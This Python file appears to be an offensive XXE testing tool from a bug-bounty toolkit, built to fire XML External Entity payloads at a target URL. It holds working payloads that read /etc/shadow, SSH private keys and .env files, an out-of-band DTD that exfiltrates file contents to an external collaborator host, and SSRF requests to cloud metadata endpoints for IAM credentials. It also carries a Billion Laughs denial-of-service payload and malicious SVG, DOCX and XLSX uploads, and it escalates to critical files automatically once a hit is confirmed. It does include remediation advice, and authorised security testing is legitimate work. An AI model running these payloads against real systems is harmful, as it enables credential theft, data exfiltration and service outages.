"""
XXE Tester Agent

Comprehensive XML External Entity (XXE) vulnerability testing agent.

Tests for:
- Classic XXE (file disclosure)
- Blind XXE (out-of-band data exfiltration)
- XInclude XXE
- SSRF via XXE
- Billion Laughs DoS attack
- XXE via file upload (SVG, DOCX, XLSX)
- XXE via Content-Type manipulation
- Parameter entity exploitation
- Error-based XXE
- URL encoding bypass
- Protocol smuggling via XXE

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import requests
import time
import zipfile
import os
import re
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, quote
from dataclasses import dataclass, field
from datetime import datetime
from colorama import Fore, Style
import tempfile
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks



@dataclass
class XXETest:
    """Represents a single XXE test."""
    name: str
    payload: str
    category: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    description: str
    file_path: Optional[str] = None  # Target file to read
    content_type: str = "application/xml"
    detection_indicators: List[str] = field(default_factory=list)


@dataclass
class XXEFinding:
    """Represents an XXE vulnerability finding."""
    severity: str
    title: str
    category: str
    payload: str
    description: str
    evidence: Dict
    impact: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    poc: str = ""
    recommendation: str = ""

    def to_dict(self) -> Dict:
        """Convert finding to dictionary."""
        return {
            'severity': self.severity,
            'title': self.title,
            'category': self.category,
            'payload': self.payload,
            'description': self.description,
            'evidence': self.evidence,
            'impact': self.impact,
            'timestamp': self.timestamp,
            'poc': self.poc,
            'recommendation': self.recommendation
        }


class XXETester:
    """
    Comprehensive XXE vulnerability tester.

    Tests for XXE vulnerabilities using multiple techniques:
    - Classic file disclosure
    - Blind out-of-band exfiltration
    - XInclude attacks
    - SSRF via XXE
    - DoS attacks (Billion Laughs)
    - File upload vectors
    """

    # Common file paths to test
    UNIX_FILES = [
        '/etc/passwd',
        '/etc/hostname',
        '/etc/hosts',
        '/proc/self/environ',
        '/root/.ssh/id_rsa',
        '/var/www/html/.env',
        '/etc/shadow',
    ]

    WINDOWS_FILES = [
        'C:/Windows/System32/drivers/etc/hosts',
        'C:/Windows/win.ini',
        'C:/inetpub/wwwroot/web.config',
        'C:/Users/Administrator/.ssh/id_rsa',
    ]

    # Cloud metadata endpoints for SSRF via XXE
    CLOUD_METADATA = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    ]

    def __init__(self, target_url: str, param_name: Optional[str] = None,
                 target: Optional[str] = None, timeout: int = 10,
                 oast_domain: Optional[str] = None,
                 upload_mode: bool = False):
        """
        Initialize XXE tester.

        Args:
            target_url: Target URL to test (e.g., http://example.com/xml)
            param_name: Parameter name for injection. If None, payload replaces entire body
            target: Target identifier for database tracking (default: extracted from URL)
            timeout: Request timeout in seconds
            oast_domain: Out-of-band domain for blind XXE (e.g., burpcollaborator.net)
            upload_mode: Whether endpoint is file upload (not XML processing)
        """
        self.target_url = target_url
        self.param_name = param_name
        self.timeout = timeout
        self.oast_domain = oast_domain or "burpcollaborator.net"
        self.upload_mode = upload_mode
        self.findings: List[XXEFinding] = []
        self.tests_run = 0
        self.tests_passed = 0

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            parsed = urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

        # Create temp directory for file generation
        self.temp_dir = tempfile.mkdtemp(prefix='xxe_test_')

    def run_all_tests(self) -> List[XXEFinding]:
        """
        Run all XXE tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'xxe_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting comprehensive XXE testing...{Style.RESET_ALL}")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Mode: {'File Upload' if self.upload_mode else 'XML Processing'}")
        print(f"[*] Timeout: {self.timeout}s")

        # Run test categories based on mode
        if self.upload_mode:
            self._test_xxe_file_upload()
        else:
            self._test_classic_xxe()
            self._test_parameter_entities()
            self._test_xinclude_xxe()
            self._test_ssrf_via_xxe()
            self._test_billion_laughs()
            self._test_content_type_manipulation()
            self._test_blind_xxe()
            self._test_url_encoding_bypass()

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'xxe_tester',
            findings_count=len(self.findings),
            duration_seconds=0,
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in ['CRITICAL', 'HIGH']:
                PayloadHooks.record_payload_success(
                    payload_text=finding.payload[:500],  # Truncate long payloads
                    vuln_type='XXE',
                    context=finding.category,
                    notes=finding.title
                )

        print(f"\n{Fore.CYAN}=== XXE TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Tests run: {self.tests_run}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        # Cleanup temp files
        self._cleanup()

        return self.findings

    def _test_classic_xxe(self):
        """Test classic XXE file disclosure."""
        print(f"\n{Fore.YELLOW}[*] Testing classic XXE file disclosure...{Style.RESET_ALL}")

        # Test both Unix and Windows paths
        test_files = self.UNIX_FILES[:3] + self.WINDOWS_FILES[:2]

        for file_path in test_files:
            self.tests_run += 1

            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<data>
    <user>&xxe;</user>
</data>'''

            test = XXETest(
                name=f"Classic XXE - {file_path}",
                payload=payload,
                category="Classic XXE",
                severity="HIGH",
                description=f"Classic XXE file disclosure targeting {file_path}",
                file_path=file_path,
                detection_indicators=self._get_file_indicators(file_path)
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1
                # Found one, escalate to critical files
                self._exploit_critical_files()
                break

    def _exploit_critical_files(self):
        """Exploit confirmed XXE to read critical files."""
        print(f"{Fore.RED}[!] XXE confirmed! Attempting to read critical files...{Style.RESET_ALL}")

        critical_files = [
            '/etc/shadow',
            '/root/.ssh/id_rsa',
            '/var/www/html/.env',
            '/proc/self/environ',
            'C:/inetpub/wwwroot/web.config',
        ]

        for file_path in critical_files:
            self.tests_run += 1

            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<data>
    <content>&xxe;</content>
</data>'''

            test = XXETest(
                name=f"XXE Exploit - {file_path}",
                payload=payload,
                category="XXE Exploitation",
                severity="CRITICAL",
                description=f"Exploiting XXE to read sensitive file: {file_path}",
                file_path=file_path,
                detection_indicators=self._get_file_indicators(file_path)
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_parameter_entities(self):
        """Test XXE with parameter entities."""
        print(f"\n{Fore.YELLOW}[*] Testing parameter entity XXE...{Style.RESET_ALL}")

        self.tests_run += 1

        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{self.oast_domain}/?data=%file;'>">
    %eval;
    %exfiltrate;
]>
<data></data>'''

        test = XXETest(
            name="Parameter Entity XXE",
            payload=payload,
            category="Parameter Entity XXE",
            severity="HIGH",
            description="XXE using parameter entities for potential data exfiltration",
            detection_indicators=['hostname', self.oast_domain]
        )

        finding = self._execute_test(test)
        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

    def _test_xinclude_xxe(self):
        """Test XInclude XXE attacks."""
        print(f"\n{Fore.YELLOW}[*] Testing XInclude XXE...{Style.RESET_ALL}")

        # Test 1: XInclude with file inclusion
        self.tests_run += 1

        payload = '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>'''

        test = XXETest(
            name="XInclude XXE",
            payload=payload,
            category="XInclude XXE",
            severity="HIGH",
            description="XXE via XInclude when DOCTYPE is not controllable",
            file_path="/etc/passwd",
            detection_indicators=['root:', '/bin/bash', '/sbin/nologin']
        )

        finding = self._execute_test(test)
        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

        # Test 2: XInclude in JSON (backend XML processing)
        self.tests_run += 1

        json_payload = {
            'data': '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>'
        }

        finding = self._execute_json_test(
            json_payload,
            "XInclude in JSON",
            "XInclude XXE",
            "HIGH",
            "XInclude XXE when JSON is converted to XML on backend",
            ['hostname']
        )

        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

    def _test_ssrf_via_xxe(self):
        """Test SSRF attacks via XXE."""
        print(f"\n{Fore.YELLOW}[*] Testing SSRF via XXE...{Style.RESET_ALL}")

        # Test internal network access
        internal_targets = [
            'http://localhost/',
            'http://127.0.0.1/',
            'http://localhost:8080/',
            'http://192.168.1.1/',
        ]

        for target in internal_targets[:2]:  # Test a couple
            self.tests_run += 1

            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "{target}">
]>
<data>
    <content>&xxe;</content>
</data>'''

            test = XXETest(
                name=f"SSRF via XXE - {target}",
                payload=payload,
                category="SSRF via XXE",
                severity="HIGH",
                description=f"SSRF to internal network via XXE: {target}",
                detection_indicators=['apache', 'nginx', 'iis', 'server', 'html']
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1
                break  # Found SSRF, test cloud metadata next

        # Test cloud metadata
        self._test_cloud_metadata_xxe()

    def _test_cloud_metadata_xxe(self):
        """Test SSRF to cloud metadata via XXE."""
        print(f"{Fore.YELLOW}[*] Testing cloud metadata access via XXE...{Style.RESET_ALL}")

        for endpoint in self.CLOUD_METADATA:
            self.tests_run += 1

            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "{endpoint}">
]>
<data>
    <content>&xxe;</content>
</data>'''

            test = XXETest(
                name=f"XXE to Cloud Metadata",
                payload=payload,
                category="XXE Cloud Metadata",
                severity="CRITICAL",
                description=f"SSRF to cloud metadata service via XXE: {endpoint}",
                detection_indicators=[
                    'ami-id', 'instance-id', 'security-credentials',
                    'iam', 'AccessKeyId', 'SecretAccessKey',
                    'metadata', 'computemetadata'
                ]
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1
                break  # Critical finding, stop here

    def _test_billion_laughs(self):
        """Test Billion Laughs DoS attack."""
        print(f"\n{Fore.YELLOW}[*] Testing Billion Laughs DoS...{Style.RESET_ALL}")

        self.tests_run += 1

        payload = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''

        test = XXETest(
            name="Billion Laughs DoS",
            payload=payload,
            category="DoS Attack",
            severity="MEDIUM",
            description="Billion Laughs exponential entity expansion DoS",
            detection_indicators=[]  # Detected via timing
        )

        # Special timing-based detection
        finding = self._execute_timing_test(test)
        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

    def _test_content_type_manipulation(self):
        """Test XXE via Content-Type manipulation."""
        print(f"\n{Fore.YELLOW}[*] Testing Content-Type manipulation...{Style.RESET_ALL}")

        # If endpoint expects JSON, try sending XML
        if 'json' in self.target_url.lower() or self.param_name:
            self.tests_run += 1

            payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <user>&xxe;</user>
</data>'''

            test = XXETest(
                name="Content-Type Change XXE",
                payload=payload,
                category="Content-Type Manipulation",
                severity="HIGH",
                description="XXE via changing Content-Type from JSON to XML",
                file_path="/etc/passwd",
                content_type="application/xml",
                detection_indicators=['root:', '/bin/bash']
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _test_blind_xxe(self):
        """Test blind XXE with out-of-band detection."""
        print(f"\n{Fore.YELLOW}[*] Testing blind XXE (out-of-band)...{Style.RESET_ALL}")

        self.tests_run += 1

        unique_id = f"{int(time.time())}"
        oast_url = f"{unique_id}.{self.oast_domain}"

        # Note: This requires hosting the DTD, but we can test the request
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://{oast_url}/external.dtd">
    %xxe;
]>
<data></data>'''

        print(f"[*] Blind XXE test - Check for callback to: {oast_url}")
        print(f"[*] Expected external.dtd content:")
        print(f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{oast_url}/?data=%file;'>">
%eval;
%exfiltrate;''')

        test = XXETest(
            name="Blind XXE (OOB)",
            payload=payload,
            category="Blind XXE",
            severity="MEDIUM",
            description=f"Blind XXE with out-of-band callback to {oast_url}",
            detection_indicators=[]  # Requires manual verification
        )

        finding = self._execute_test(test, blind=True)
        if finding:
            finding.poc = f"""
1. Host this DTD at http://{oast_url}/external.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{oast_url}/?data=%file;'>">
%eval;
%exfiltrate;

2. Send the XXE payload
3. Monitor for HTTP callback to {oast_url}
"""
            self.findings.append(finding)
            self.tests_passed += 1

    def _test_url_encoding_bypass(self):
        """Test URL encoding bypass techniques."""
        print(f"\n{Fore.YELLOW}[*] Testing URL encoding bypass...{Style.RESET_ALL}")

        bypass_payloads = [
            ('Single encode', quote('file:///etc/passwd')),
            ('Double encode', quote(quote('file:///etc/passwd'))),
            ('Partial encode', 'file:///etc/pas%73wd'),
        ]

        for name, encoded_path in bypass_payloads:
            self.tests_run += 1

            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "{encoded_path}">
]>
<data>
    <user>&xxe;</user>
</data>'''

            test = XXETest(
                name=f"URL Encoding Bypass - {name}",
                payload=payload,
                category="Encoding Bypass",
                severity="HIGH",
                description=f"XXE bypass using {name}",
                detection_indicators=['root:', '/bin/bash']
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1
                break

    def _test_xxe_file_upload(self):
        """Test XXE via file upload (SVG, DOCX, XLSX)."""
        print(f"\n{Fore.YELLOW}[*] Testing XXE via file upload...{Style.RESET_ALL}")

        # Test SVG upload
        self._test_xxe_svg()

        # Test DOCX upload
        self._test_xxe_docx()

        # Test XLSX upload
        self._test_xxe_xlsx()

    def _test_xxe_svg(self):
        """Test XXE via SVG upload."""
        print(f"[*] Testing SVG upload...")

        self.tests_run += 1

        svg_content = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''

        svg_path = os.path.join(self.temp_dir, 'xxe.svg')
        with open(svg_path, 'w') as f:
            f.write(svg_content)

        finding = self._upload_file(
            svg_path,
            'image/svg+xml',
            "XXE via SVG Upload",
            "File Upload XXE",
            "HIGH",
            "XXE via SVG file upload with embedded entity",
            ['root:', '/bin/bash']
        )

        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

    def _test_xxe_docx(self):
        """Test XXE via DOCX upload."""
        print(f"[*] Testing DOCX upload...")

        self.tests_run += 1

        xxe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>
    <body>&xxe;</body>
</document>'''

        docx_path = os.path.join(self.temp_dir, 'xxe.docx')

        with zipfile.ZipFile(docx_path, 'w') as docx:
            docx.writestr('word/document.xml', xxe_xml)
            docx.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types></Types>')
            docx.writestr('_rels/.rels', '<?xml version="1.0"?><Relationships></Relationships>')

        finding = self._upload_file(
            docx_path,
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            "XXE via DOCX Upload",
            "File Upload XXE",
            "HIGH",
            "XXE via DOCX file upload with malicious word/document.xml",
            ['root:', '/bin/bash', 'passwd']
        )

        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

    def _test_xxe_xlsx(self):
        """Test XXE via XLSX upload."""
        print(f"[*] Testing XLSX upload...")

        self.tests_run += 1

        xxe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<worksheet>
    <sheetData>
        <row><c t="inlineStr"><is><t>&xxe;</t></is></c></row>
    </sheetData>
</worksheet>'''

        xlsx_path = os.path.join(self.temp_dir, 'xxe.xlsx')

        with zipfile.ZipFile(xlsx_path, 'w') as xlsx:
            xlsx.writestr('xl/worksheets/sheet1.xml', xxe_xml)
            xlsx.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types></Types>')

        finding = self._upload_file(
            xlsx_path,
            'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            "XXE via XLSX Upload",
            "File Upload XXE",
            "MEDIUM",
            "XXE via XLSX file upload with malicious worksheet",
            ['hostname']
        )

        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

    def _execute_test(self, test: XXETest, blind: bool = False) -> Optional[XXEFinding]:
        """
        Execute a single XXE test.

        Args:
            test: XXETest to execute
            blind: Whether this is a blind XXE test (requires manual verification)

        Returns:
            XXEFinding if vulnerability found, None otherwise
        """
        try:
            response = self._make_request(test.payload, test.content_type)

            if response:
                # Check for XXE indicators in response
                is_vulnerable = self._check_xxe_response(response, test.detection_indicators)

                if is_vulnerable or blind:
                    return XXEFinding(
                        severity=test.severity,
                        title=test.name,
                        category=test.category,
                        payload=test.payload,
                        description=test.description,
                        evidence={
                            'response_code': response.status_code,
                            'response_body': response.text[:1000],
                            'response_headers': dict(response.headers),
                            'content_type_sent': test.content_type
                        },
                        impact=self._get_impact(test.category),
                        recommendation=self._get_recommendation(test.category)
                    )

        except Exception as e:
            # Silent failure for expected exceptions
            pass

        return None

    def _execute_timing_test(self, test: XXETest) -> Optional[XXEFinding]:
        """Execute timing-based test (for Billion Laughs)."""
        try:
            start = time.time()
            response = self._make_request(test.payload, test.content_type, timeout_override=self.timeout)
            elapsed = time.time() - start

            # If processing took > 5 seconds or timed out, likely vulnerable
            if elapsed > 5 or response is None:
                return XXEFinding(
                    severity=test.severity,
                    title=test.name,
                    category=test.category,
                    payload=test.payload,
                    description=test.description,
                    evidence={
                        'processing_time': f"{elapsed:.2f}s",
                        'timed_out': response is None,
                        'note': 'Server took excessive time to process entity expansion'
                    },
                    impact="Denial of service via entity expansion attack",
                    recommendation="Disable external entity processing and limit entity expansion depth"
                )

        except requests.exceptions.Timeout:
            return XXEFinding(
                severity=test.severity,
                title=test.name,
                category=test.category,
                payload=test.payload,
                description=f"{test.description} (Server timeout)",
                evidence={
                    'timed_out': True,
                    'timeout_seconds': self.timeout,
                    'note': 'Server timed out processing entity expansion'
                },
                impact="Denial of service via entity expansion attack",
                recommendation="Disable external entity processing and limit entity expansion depth"
            )

        return None

    def _execute_json_test(self, json_payload: Dict, name: str, category: str,
                          severity: str, description: str,
                          indicators: List[str]) -> Optional[XXEFinding]:
        """Execute test with JSON payload."""
        try:
            response = requests.post(
                self.target_url,
                json=json_payload,
                timeout=self.timeout,
                verify=False
            )

            if self._check_xxe_response(response, indicators):
                return XXEFinding(
                    severity=severity,
                    title=name,
                    category=category,
                    payload=str(json_payload),
                    description=description,
                    evidence={
                        'response_code': response.status_code,
                        'response_body': response.text[:1000],
                        'json_sent': json_payload
                    },
                    impact=self._get_impact(category),
                    recommendation=self._get_recommendation(category)
                )

        except Exception:
            pass

        return None

    def _upload_file(self, file_path: str, content_type: str, name: str,
                    category: str, severity: str, description: str,
                    indicators: List[str]) -> Optional[XXEFinding]:
        """Upload file and check for XXE."""
        try:
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f, content_type)}
                response = requests.post(
                    self.target_url,
                    files=files,
                    timeout=self.timeout,
                    verify=False
                )

            # Check immediate response
            if self._check_xxe_response(response, indicators):
                return XXEFinding(
                    severity=severity,
                    title=name,
                    category=category,
                    payload=f"File: {os.path.basename(file_path)}",
                    description=description,
                    evidence={
                        'response_code': response.status_code,
                        'response_body': response.text[:1000],
                        'file_name': os.path.basename(file_path),
                        'content_type': content_type
                    },
                    impact=self._get_impact(category),
                    recommendation=self._get_recommendation(category),
                    poc=f"Upload the malicious {os.path.splitext(file_path)[1]} file and check processed output"
                )

            # Try to retrieve uploaded file if URL in response
            if response.status_code == 200:
                try:
                    data = response.json()
                    uploaded_url = data.get('url') or data.get('path') or data.get('location')

                    if uploaded_url:
                        retrieve_response = requests.get(uploaded_url, timeout=5, verify=False)
                        if self._check_xxe_response(retrieve_response, indicators):
                            return XXEFinding(
                                severity=severity,
                                title=f"{name} (Retrieved)",
                                category=category,
                                payload=f"File: {os.path.basename(file_path)}",
                                description=f"{description} - XXE payload executed when file retrieved",
                                evidence={
                                    'upload_response': response.status_code,
                                    'retrieved_url': uploaded_url,
                                    'retrieved_body': retrieve_response.text[:1000]
                                },
                                impact=self._get_impact(category),
                                recommendation=self._get_recommendation(category),
                                poc=f"1. Upload {os.path.basename(file_path)}\n2. Retrieve from {uploaded_url}\n3. XXE executes on retrieval"
                            )
                except Exception:
                    pass

        except Exception:
            pass

        return None

    def _make_request(self, payload: str, content_type: str,
                     timeout_override: Optional[int] = None) -> Optional[requests.Response]:
        """
        Make HTTP request with XXE payload.

        Args:
            payload: XXE payload
            content_type: Content-Type header
            timeout_override: Override default timeout

        Returns:
            Response object or None
        """
        try:
            timeout = timeout_override or self.timeout

            if self.param_name:
                # Send as parameter
                response = requests.post(
                    self.target_url,
                    data={self.param_name: payload},
                    timeout=timeout,
                    verify=False
                )
            else:
                # Send as body
                response = requests.post(
                    self.target_url,
                    data=payload,
                    headers={'Content-Type': content_type},
                    timeout=timeout,
                    verify=False
                )

            return response

        except requests.exceptions.Timeout:
            return None
        except Exception:
            return None

    def _check_xxe_response(self, response: requests.Response,
                           indicators: List[str]) -> bool:
        """
        Check if response indicates XXE vulnerability.

        Args:
            response: HTTP response
            indicators: List of strings to look for

        Returns:
            True if XXE detected
        """
        if not response:
            return False

        text = response.text.lower()

        # Check for specific indicators
        if indicators:
            return any(indicator.lower() in text for indicator in indicators)

        # Generic XXE detection (long response with unexpected content)
        if response.status_code == 200 and len(response.text) > 100:
            # Check for common file content patterns
            file_patterns = [
                'root:', '/bin/', 'administrator:', 'windows',
                'ami-id', 'instance-id', 'accesskey', 'secretkey'
            ]
            return any(pattern in text for pattern in file_patterns)

        return False

    def _get_file_indicators(self, file_path: str) -> List[str]:
        """Get expected indicators for a file."""
        indicators_map = {
            '/etc/passwd': ['root:', '/bin/bash', '/bin/sh', '/sbin/nologin'],
            '/etc/hostname': [],  # Varies
            '/etc/hosts': ['localhost', '127.0.0.1', 'ip6-localhost'],
            '/etc/shadow': ['root:', ':$', '::'],
            '/proc/self/environ': ['PATH=', 'HOME=', 'USER='],
            '/root/.ssh/id_rsa': ['-----BEGIN', 'PRIVATE KEY', 'RSA'],
            'C:/Windows/win.ini': ['[extensions]', '[fonts]', 'windows'],
            'C:/Windows/System32/drivers/etc/hosts': ['localhost', '127.0.0.1'],
        }

        return indicators_map.get(file_path, [])

    def _get_impact(self, category: str) -> str:
        """Get impact description for finding category."""
        impacts = {
            "Classic XXE": "Arbitrary file disclosure. Attacker can read sensitive files like /etc/passwd, /etc/shadow, configuration files, private keys, and application source code.",
            "XXE Exploitation": "Critical file disclosure including shadow passwords, SSH keys, environment variables, and cloud credentials. Complete system compromise possible.",
            "Parameter Entity XXE": "Out-of-band data exfiltration. Attacker can exfiltrate file contents to external server even when response is not visible.",
            "XInclude XXE": "File disclosure via XInclude even when DOCTYPE is not controllable. Can bypass certain XXE protections.",
            "SSRF via XXE": "Server-Side Request Forgery via XXE. Attacker can scan internal network, access internal services, and pivot to other systems.",
            "XXE Cloud Metadata": "Critical - Access to cloud instance metadata including IAM credentials, API keys, and instance details. Can lead to full cloud account compromise.",
            "DoS Attack": "Denial of Service via exponential entity expansion. Can crash XML parser or consume excessive CPU/memory causing service outage.",
            "Content-Type Manipulation": "XXE via Content-Type bypass. Endpoint accepts XML when it should only accept JSON, enabling XXE attacks.",
            "Blind XXE": "Blind XXE with out-of-band data exfiltration. Attacker can exfiltrate data even when application doesn't return it in response.",
            "Encoding Bypass": "XXE filter bypass using URL encoding. Can circumvent weak input validation and blacklist-based protections.",
            "File Upload XXE": "XXE via file upload. Malicious files (SVG, DOCX, XLSX) execute XXE when processed, leading to file disclosure or SSRF.",
        }
        return impacts.get(category, "XML External Entity vulnerability enabling file disclosure and SSRF attacks")

    def _get_recommendation(self, category: str) -> str:
        """Get remediation recommendation."""
        return """Remediation:
1. Disable external entity processing in XML parser
2. Disable DTD processing if not required
3. Use less complex data formats like JSON when possible
4. Implement input validation and sanitization
5. Keep XML parser libraries up to date
6. Use allowlists for permitted protocols/file paths
7. Implement proper error handling to prevent information disclosure

Configuration examples:
- Java: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
- PHP: libxml_disable_entity_loader(true)
- Python: defusedxml library
- .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit
"""

    def _print_findings_summary(self):
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] XXE VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            if finding.severity not in by_severity:
                by_severity[finding.severity] = []
            by_severity[finding.severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.title}")
                    print(f"    Category: {f.category}")

    def _cleanup(self):
        """Clean up temporary files."""
        try:
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except Exception:
            pass

    def get_findings(self) -> List[XXEFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: str) -> List[XXEFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]


def main():
    """CLI interface."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python xxe_tester.py <url> [--upload] [--oast-domain domain]")
        print("Example: python xxe_tester.py 'http://example.com/xml'")
        print("         python xxe_tester.py 'http://example.com/upload' --upload")
        print("         python xxe_tester.py 'http://example.com/xml' --oast-domain burpcollaborator.net")
        sys.exit(1)

    target_url = sys.argv[1]
    upload_mode = '--upload' in sys.argv
    oast_domain = None

    if '--oast-domain' in sys.argv:
        idx = sys.argv.index('--oast-domain')
        if len(sys.argv) > idx + 1:
            oast_domain = sys.argv[idx + 1]

    tester = XXETester(target_url, upload_mode=upload_mode, oast_domain=oast_domain)
    findings = tester.run_all_tests()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Total tests: {tester.tests_run}")
    print(f"Findings: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] XXE vulnerabilities detected!{Style.RESET_ALL}")
        print(f"Review findings and validate manually.")


if __name__ == "__main__":
    main()
